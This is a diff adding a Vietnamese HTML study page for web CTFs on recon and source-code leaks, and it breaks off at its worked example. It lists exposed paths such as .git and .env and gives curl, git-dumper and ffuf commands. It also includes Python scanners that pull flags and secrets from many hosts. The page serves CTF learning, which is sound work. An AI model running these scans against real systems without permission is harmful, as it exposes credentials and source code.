@@ -1,0 +1,558 @@
+<title>Recon &amp; Source Leak — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Recon — làm ĐẦU TIÊN với mọi service lạ</div>
+    <h1>Recon &amp; Source Leak</h1>
+    <p class="sub">Trước khi nghĩ tới SQLi/XSS/SSTI... luôn kiểm tra xem server có <strong>vô tình để lộ mã nguồn
+    hoặc file cấu hình</strong> không. Đọc được source gần như luôn là cách nhanh nhất để biết chính xác lỗ hổng
+    nằm ở đâu — thay vì dò mù bằng payload.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Recon &amp; Source Leak là gì, để làm gì?</h2>
+  <p class="lead">Rất nhiều service bị triển khai (deploy) ẩu — quên xóa thư mục <code>.git</code>, để lộ file
+  <code>.env</code> chứa mật khẩu database, hay quên tắt trang debug hiện toàn bộ source khi có lỗi. Việc
+  <strong>recon</strong> (thu thập thông tin) là bước đầu tiên, bắt buộc với MỌI service bạn gặp — vì chỉ cần 5
+  phút kiểm tra đúng chỗ, bạn có thể đọc được <strong>toàn bộ mã nguồn</strong> thay vì phải dò mù từng loại lỗ
+  hổng một.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Luôn thử truy cập <code>/.git/config</code> đầu tiên với MỌI service — nếu trả về nội dung (không phải 404),
+  bạn dump được <strong>toàn bộ lịch sử source code</strong> chỉ bằng 1 lệnh (<code>git-dumper</code>, mục 07),
+  không cần tìm lỗ hổng gì khác nữa.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ RECON &amp; SOURCE LEAK</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Mọi service MỚI nhận đều đáng thử ngay: <code>/.git/config</code>, <code>/.env</code>,
+        <code>/robots.txt</code>, <code>/backup.zip</code> — nếu bất kỳ cái nào trả về 200 (không phải 404) ⟹
+        trúng ngay từ bước đầu tiên, không cần tìm lỗ hổng phức tạp.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Không cần gì đặc biệt — đây là bước <strong>luôn làm đầu tiên</strong> với mọi service, trước cả khi biết
+        service đó chạy công nghệ gì.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng curl/ffuf</span>
+        <code>curl -s http://TARGET/.git/config</code> — xem có nội dung không. Nếu có, chạy
+        <code>git-dumper</code> ngay (mục 07) để lấy toàn bộ.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># Thử tuần tự các đường dẫn hay lộ (xem bảng đầy đủ mục 06)</span>
+curl http://TARGET/.git/config
+curl http://TARGET/.env
+curl http://TARGET/robots.txt
+curl http://TARGET/.git/HEAD
+
+<span class="c"># Nếu .git lộ -- dump toàn bộ source ngay</span>
+python3 ~/hoc/CTF/Tools/web/git-dumper/git_dumper.py http://TARGET/.git/ ./dumped_source</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> requests
+
+PATHS = [<span class="s">".git/config"</span>, <span class="s">".env"</span>, <span class="s">"robots.txt"</span>, <span class="s">"backup.zip"</span>, <span class="s">"config.php.bak"</span>]
+<span class="k">for</span> p <span class="k">in</span> PATHS:
+    r = requests.get(<span class="s">f"http://TARGET/{p}"</span>)
+    <span class="k">if</span> r.status_code == 200:
+        <span class="k">print</span>(<span class="s">f"LỘ: {p} ({len(r.text)} bytes)"</span>)</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        <code>.git</code> trả 403 (không phải 404) → thư mục có tồn tại nhưng bị chặn truy cập trực tiếp index,
+        vẫn có thể dump được từng file lẻ bằng <code>git-dumper</code> (nó không liệt kê thư mục, chỉ tải từng
+        file theo tên đã biết trước). WAF rule nhanh: chặn path bắt đầu bằng <code>/.git/</code>,
+        <code>/.env</code>. Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Deploy (triển khai)</b> — quá trình đưa code từ máy lập trình viên lên server thật để chạy.
+  Cách làm đúng: chỉ copy đúng file cần chạy. Cách làm ẩu (hay gặp ở service dựng nhanh cho CTF): copy
+  <strong>nguyên cả thư mục dự án</strong>, bao gồm cả file không nên public.</div>
+  <div class="def"><b>Thư mục <code>.git</code></b> — nơi Git lưu toàn bộ <strong>lịch sử</strong> source code
+  (mọi commit, mọi phiên bản từng có, kể cả những dòng code đã bị xóa sau này). Nếu thư mục này vô tình được
+  web server phục vụ công khai, ai cũng tải về được và khôi phục lại <strong>toàn bộ</strong> source + lịch sử.</div>
+  <div class="def"><b>File <code>.env</code></b> — quy ước phổ biến để lưu biến môi trường (database password,
+  API key, SECRET_KEY) tách riêng khỏi code, KHÔNG nên được web server phục vụ công khai.</div>
+  <p>Vì sao điều này hay xảy ra: khi dựng service CTF nhanh, người tạo đề thường chỉ làm
+  <code>git clone</code> → <code>docker build .</code> hoặc copy thẳng thư mục dự án vào webroot mà quên loại
+  trừ các file/thư mục ẩn này.</p>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Web server phục vụ "mọi file nó tìm thấy", không chỉ file được định sẵn</h2>
+  <p>Mặc định, nhiều web server (đặc biệt cấu hình đơn giản như Python <code>http.server</code>, hoặc Apache/Nginx
+  không cấu hình kỹ) sẽ <strong>phục vụ bất kỳ file nào nằm trong webroot</strong> nếu có đường dẫn URL khớp tên
+  file đó — kể cả file không định để công khai. Phải <strong>chủ động cấu hình chặn</strong> (deny rule cho
+  <code>.git</code>, <code>.env</code>...) thì các file này mới bị giấu đi — đây không phải hành vi mặc định an
+  toàn, mà là thứ lập trình viên phải tự nhớ làm thêm.</p>
+  <p>Trong môi trường CTF dựng nhanh (ưu tiên "chạy được" hơn "chuẩn production"), bước cấu hình thêm này rất hay
+  bị bỏ qua.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Từ .git lộ ra tới toàn bộ source</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 190" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr12)}
+    </style>
+    <defs><marker id="arr12" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="200" height="50" rx="10" class="box-a"/>
+    <text x="22" y="40" class="lbl-m">GET /.git/config</text>
+    <text x="22" y="55" class="lbl-a">-&gt; HTTP 200 (lộ!)</text>
+
+    <path d="M220,45 H258" class="arrow"/>
+    <rect x="263" y="20" width="200" height="50" rx="10" class="box"/>
+    <text x="275" y="40" class="lbl-m">git-dumper tải từng</text>
+    <text x="275" y="55" class="lbl">object/pack file trong .git/</text>
+
+    <path d="M470,45 H508" class="arrow"/>
+    <rect x="513" y="20" width="157" height="50" rx="10" class="box-a"/>
+    <text x="525" y="40" class="lbl-m">git checkout</text>
+    <text x="525" y="55" class="lbl-a">-&gt; khôi phục FULL source</text>
+
+    <text x="10" y="110" class="lbl-m">Có source -&gt; đọc ra:</text>
+    <rect x="10" y="120" width="200" height="50" rx="10" class="box"/>
+    <text x="22" y="140" class="lbl">Đúng lỗ hổng cố ý cài</text>
+    <text x="22" y="155" class="lbl">(SQLi/SSTI/LFI chỗ nào)</text>
+
+    <rect x="263" y="120" width="200" height="50" rx="10" class="box"/>
+    <text x="275" y="140" class="lbl">SECRET_KEY, mật khẩu DB</text>
+    <text x="275" y="155" class="lbl">hardcode trong config</text>
+  </svg>
+  </div>
+  <p>Điểm quan trọng: <code>git-dumper</code> <strong>không cần</strong> web server cho phép liệt kê thư mục
+  (directory listing). Nó hoạt động bằng cách: đọc <code>.git/config</code> và <code>.git/HEAD</code> trước để
+  biết cấu trúc repo, rồi dựa vào <strong>định dạng cố định</strong> của Git (file object luôn nằm ở
+  <code>.git/objects/xx/yyyy...</code>, tên file có thể tính trước được từ hash) để tải từng file object cần
+  thiết — kể cả khi bạn không "thấy" được danh sách file, công cụ vẫn đoán đúng đường dẫn cần tải.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Checklist recon — làm theo thứ tự với MỌI service mới</h2>
+  <table>
+    <tr><th>Bước</th><th>Việc làm</th><th>Lý do</th></tr>
+    <tr><td>1</td><td>Xem HTTP response header (<code>Server</code>, <code>X-Powered-By</code>, <code>Set-Cookie</code>)</td><td>Đoán ngôn ngữ/framework ngay lập tức</td></tr>
+    <tr><td>2</td><td>Thử <code>/.git/config</code>, <code>/.env</code>, <code>/.git/HEAD</code></td><td>Source leak — nếu trúng, bỏ qua mọi bước sau</td></tr>
+    <tr><td>3</td><td>Thử <code>/robots.txt</code>, <code>/sitemap.xml</code></td><td>Có thể tự lộ đường dẫn admin/debug không muốn bị index</td></tr>
+    <tr><td>4</td><td>Xem HTML source + file JS (comment, endpoint API ẩn)</td><td>Lộ cấu trúc API, tên tham số</td></tr>
+    <tr><td>5</td><td>Fuzz thư mục/file bằng ffuf + wordlist</td><td>Tìm file backup, endpoint không liên kết từ đâu</td></tr>
+    <tr><td>6</td><td>Nếu chưa thấy gì, mới bắt đầu thử payload lỗ hổng (SQLi, SSTI...)</td><td>Recon luôn rẻ hơn và nhanh hơn dò payload mù</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Dùng Burp để xem response headers + source HTML nhanh</span>
+  <ol style="margin:4px 0 0">
+    <li>Truy cập trang chủ qua Burp Proxy, xem tab <strong>HTTP history</strong> → click request → tab
+    <strong>Response</strong> → xem Headers (Server, Set-Cookie...).</li>
+    <li>Tab <strong>Repeater</strong>: đổi URL thành <code>/.git/config</code>, Send, xem status code + body.</li>
+    <li>Lặp lại nhanh cho từng đường dẫn trong bảng mục 06 — không cần mở trình duyệt mỗi lần, chỉ sửa URL trong
+    Repeater rồi Send.</li>
+  </ol></div>
+  <div class="note tip"><span class="tag">Dùng Burp Target → Site map</span>Sau khi duyệt web vài trang bằng
+  trình duyệt (qua proxy Burp), tab <strong>Target → Site map</strong> tự liệt kê mọi URL/file JS đã load — lướt
+  qua đây nhanh hơn tự đọc "View Source" từng trang.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / DANH SÁCH ĐƯỜNG DẪN HAY LỘ</div>
+  <h2>Checklist đầy đủ — thử theo thứ tự ưu tiên</h2>
+
+  <h3>A. Source code / bí mật <span class="badge easy">ưu tiên cao nhất</span></h3>
+  <table>
+    <tr><th>Đường dẫn</th><th>Lộ gì</th></tr>
+    <tr><td><code>/.git/config</code>, <code>/.git/HEAD</code></td><td>Toàn bộ source + lịch sử Git</td></tr>
+    <tr><td><code>/.env</code></td><td>Database password, API key, SECRET_KEY</td></tr>
+    <tr><td><code>/.svn/</code>, <code>/.hg/</code></td><td>Tương đương .git cho Subversion/Mercurial (hiếm hơn)</td></tr>
+    <tr><td><code>/config.php.bak</code>, <code>/settings.py.bak</code>, <code>/index.php~</code>, <code>/index.php.swp</code></td><td>File backup/tạm của editor (vim <code>.swp</code>), thường quên xóa</td></tr>
+    <tr><td><code>/backup.zip</code>, <code>/app.tar.gz</code>, <code>/www.zip</code></td><td>Backup nguyên cụm, tên thường đoán được theo pattern dự án</td></tr>
+    <tr><td><code>/.DS_Store</code></td><td>File macOS Finder, có thể lộ tên file/thư mục khác trong cùng folder</td></tr>
+  </table>
+
+  <h3>B. Endpoint &amp; cấu hình lộ</h3>
+  <table>
+    <tr><th>Đường dẫn</th><th>Lộ gì</th></tr>
+    <tr><td><code>/robots.txt</code>, <code>/sitemap.xml</code></td><td>Đường dẫn admin/debug không muốn bị Google index — nhưng vẫn truy cập trực tiếp được</td></tr>
+    <tr><td><code>/api-docs</code>, <code>/swagger.json</code>, <code>/.well-known/</code></td><td>Toàn bộ API spec, bao gồm endpoint ẩn</td></tr>
+    <tr><td><code>/phpinfo.php</code>, <code>/debug</code>, trang lỗi verbose</td><td>Phiên bản ngôn ngữ, đường dẫn server, biến môi trường</td></tr>
+    <tr><td><code>/actuator/env</code>, <code>/actuator/heapdump</code> (Spring Boot)</td><td>Toàn bộ biến môi trường, hoặc cả bộ nhớ heap (chứa session/credential)</td></tr>
+  </table>
+
+  <h3>C. Kỹ thuật dò khi không đoán được tên file</h3>
+  <table>
+    <tr><th>Kỹ thuật</th><th>Công cụ</th></tr>
+    <tr><td>Fuzzing thư mục/file bằng wordlist</td><td><code>ffuf</code> + SecLists (mục 07)</td></tr>
+    <tr><td>HTTP verb tampering (thử PUT/DELETE/PATCH/TRACE)</td><td>Burp Repeater, đổi method</td></tr>
+    <tr><td>So sánh response để phát hiện endpoint ẩn (độ dài khác biệt)</td><td>ffuf <code>-fs</code>/<code>-mc</code></td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: GIT-DUMPER, GITTOOLS &amp; FFUF</div>
+  <h2>Không muốn tự tải từng file .git? Dùng công cụ</h2>
+
+  <h3>A. git-dumper — dump toàn bộ .git chỉ bằng 1 lệnh</h3>
+  <div class="def"><b>git-dumper</b> — tự động: đọc <code>.git/config</code>+<code>HEAD</code>, suy ra toàn bộ
+  object cần tải, tải về, rồi tự <code>git checkout</code> để bạn có nguyên source code như lúc clone bình
+  thường. Đã clone về <code>~/hoc/CTF/Tools/web/git-dumper/</code> (từ <code>arthaud/git-dumper</code>, 2700+ sao).</div>
+  <pre><code>python3 ~/hoc/CTF/Tools/web/git-dumper/git_dumper.py http://TARGET/.git/ ./dumped_source
+cd dumped_source
+git log --oneline     <span class="c"># xem lịch sử commit -- có thể thấy cả dòng code đã bị xóa</span>
+git show --all         <span class="c"># xem mọi commit, kể cả nhánh/commit không còn trên HEAD</span></code></pre>
+  <div class="note tip"><span class="tag">Mẹo tìm bí mật trong lịch sử</span>Đôi khi mật khẩu/API key bị commit
+  nhầm rồi xóa ở commit sau — <strong>vẫn còn trong lịch sử Git</strong>. Dùng
+  <code>git log -p | grep -iE "password|secret|key"</code> để tìm qua mọi commit, không chỉ bản mới nhất.</div>
+
+  <h3>B. GitTools — bộ công cụ đầy đủ hơn (Dumper + Extractor + Finder)</h3>
+  <div class="def"><b>GitTools</b> (<code>internetwache/GitTools</code>, 4100+ sao): gồm 3 công cụ —
+  <strong>Finder</strong> (quét hàng loạt domain xem cái nào lộ .git), <strong>Dumper</strong> (tương tự
+  git-dumper), <strong>Extractor</strong> (khi chỉ tải được 1 phần file .git thô, dựng lại cấu trúc commit từ
+  những gì có). Đã clone về <code>~/hoc/CTF/Tools/web/GitTools/</code>.</div>
+  <pre><code><span class="c"># Nếu git-dumper không tải được đầy đủ, thử Extractor trên phần đã tải</span>
+cd ~/hoc/CTF/Tools/web/GitTools/Extractor
+bash extractor.sh /duong/dan/da/tai ./extracted</code></pre>
+
+  <h3>C. ffuf — fuzz tìm file/thư mục không đoán được tên (đã cài sẵn)</h3>
+  <pre><code>ffuf -u <span class="s">"http://TARGET/FUZZ"</span> \
+     -w ~/hoc/CTF/Tools/web/SecLists/Discovery/Web-Content/raft-small-files.txt \
+     -mc 200,403</code></pre>
+  <div class="note tip"><span class="tag">Vì sao thêm <code>403</code> vào <code>-mc</code></span>File/thư mục
+  trả 403 (Forbidden) nghĩa là NÓ TỒN TẠI nhưng bị chặn liệt kê — vẫn đáng thử tải trực tiếp file bên trong (như
+  trường hợp <code>.git/</code> bị 403 ở mục Combat Card) thay vì bỏ qua chỉ vì không phải 200.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET"</span>
+paths = [<span class="s">".git/config"</span>, <span class="s">".env"</span>, <span class="s">"robots.txt"</span>, <span class="s">"backup.zip"</span>]
+
+<span class="k">for</span> p <span class="k">in</span> paths:
+    r = requests.get(<span class="s">f"{url}/{p}"</span>)
+    <span class="k">print</span>(p, r.status_code, len(r.text))
+    <span class="k">if</span> r.status_code == 200:
+        <span class="k">print</span>(r.text[:300])   <span class="c"># xem thử nội dung nếu lộ</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — quét nhiều path + đọc flag trực tiếp nếu lộ</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PATHS = [<span class="s">".git/config"</span>, <span class="s">".env"</span>, <span class="s">"config.php.bak"</span>, <span class="s">"backup.zip"</span>, <span class="s">".git/HEAD"</span>]
+
+<span class="k">def</span> <span class="d">scan_leaks</span>(host):
+    <span class="k">for</span> p <span class="k">in</span> PATHS:
+        r = requests.get(<span class="s">f"http://{host}/{p}"</span>, timeout=5)
+        <span class="k">if</span> r.status_code == 200:
+            m = FLAG_RE.search(r.text)
+            <span class="k">if</span> m:
+                <span class="k">return</span> m.group()
+            <span class="k">print</span>(<span class="s">f"[{host}] Lộ: {p} ({len(r.text)} bytes) -- kiểm tra tay, có thể cần git-dumper"</span>)
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">print</span>(scan_leaks(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PATHS = [<span class="s">".env"</span>, <span class="s">"config.php.bak"</span>, <span class="s">".git/HEAD"</span>]   <span class="c"># đã xác nhận .env ăn từ bước thử tay</span>
+
+<span class="k">def</span> <span class="d">scan_leaks</span>(host):
+    <span class="k">try</span>:
+        <span class="k">for</span> p <span class="k">in</span> PATHS:
+            r = requests.get(<span class="s">f"http://{host}/{p}"</span>, timeout=5)
+            <span class="k">if</span> r.status_code == 200:
+                m = FLAG_RE.search(r.text)
+                <span class="k">if</span> m:
+                    <span class="k">return</span> m.group()
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">pass</span>
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = scan_leaks(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+  <div class="note tip"><span class="tag">Lưu ý quan trọng cho recon trong A/D</span>Recon <strong>thường chỉ cần
+  làm 1 lần</strong> trên service của chính mình (vì mọi đội chạy cùng service, nên cấu trúc file/lỗ hổng giống
+  nhau) — không phải chạy lại scan mỗi round. Sau khi recon xong và biết chính xác payload/đường dẫn nào ăn, chỉ
+  script khai thác cụ thể mới cần chạy lặp lại mỗi round.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
